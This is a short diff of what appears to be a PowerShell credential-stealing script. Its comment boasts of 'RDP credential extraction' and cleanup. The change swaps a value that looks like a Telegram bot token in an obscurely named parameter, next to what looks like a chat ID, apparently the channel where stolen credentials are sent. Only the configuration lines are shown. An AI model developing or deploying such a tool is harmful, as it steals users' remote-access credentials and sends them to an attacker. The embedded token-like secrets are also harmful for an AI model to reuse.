@@ -6,7 +6,7 @@
 # Removed CSV generation, added proper RDP credential extraction, improved file naming and cleanup
 
 param(
-    [string]$x = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
+    [string]$x = "8407278774:AAEXe4fMbmghWolLzuWIauW_X9CpKoxX82U",
     [string]$y = "2047893044"  
 )
 
